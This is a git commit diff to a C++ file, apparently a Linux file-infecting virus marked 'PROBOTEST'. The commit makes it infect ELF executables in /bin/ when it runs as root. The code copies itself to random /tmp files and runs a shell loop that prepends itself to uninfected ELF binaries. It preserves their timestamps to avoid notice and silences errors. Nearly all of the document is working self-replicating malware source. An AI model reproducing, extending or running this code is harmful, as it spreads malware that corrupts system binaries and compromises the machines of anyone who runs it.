a11f1f55c0fae4bd7bc021f4f8cdcc0ec72fbe35
Niels <niels@w3b.net>
2017-08-02 00:42:49 +0200

    Add uid=0: infect /bin/ (unstable)

--- v.cpp
+++ v.cpp
@@ -3,7 +3,7 @@
 #include <unistd.h>
 
 const char* IDENTIFIER = "PROBOTEST";
-const int MYSIZE = 19472;
+const int MYSIZE = 19816;
 
 using namespace std;
 
@@ -11,12 +11,12 @@ char* which(char* w);
 
 int main (int argc, char** argv) {
     pid_t childpid = fork();
+    uid_t uid=getuid();
     srand(time(0));
     int c;
     string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
     me = which(argv[0]);
     me = me.substr(0, me.size() - 1);
-    // cout << "\n" << me << "\n\n";
     for (int i = 0; i < 8; i++) {
         exe += (char) ((rand() % 26) + 65);
         vir += (char) ((rand() % 26) + 65);
@@ -28,17 +28,16 @@ int main (int argc, char** argv) {
         fi.seekg(MYSIZE, fi.beg);
         while ((c = fi.get()) != -1) fo << (char) c;
         fi.close(); fo.close(); fv.close();
-        command = "/bin/chmod ug+rwx ";
+        command = "2>/dev/null /bin/chmod ug+rwx ";
         command += exe;
         c = system( command.c_str() );
         if (childpid == 0) {
             c = execv((exe).c_str(), argv);
             return 0;
         } else {
-            command = "/bin/rm -f ";
-            command += exe;
-            c = system( command.c_str() );
-            command = "VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
+            command = "VIR=$(for n in `find ";
+            if (uid == 0) command += "/bin/ ";
+            command += "-mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
 do \
 file $n | grep -q ELF && ( \
 grep -q PROBOTEST $n || ( \
@@ -58,6 +57,8 @@ touch -r ${VIR}__ $VIR \
 fi; \
 rm -f ${VIR}__ ";
             command += vir;
+            command += " ";
+            command += exe;
             c = system( (command).c_str() );
         }
     }
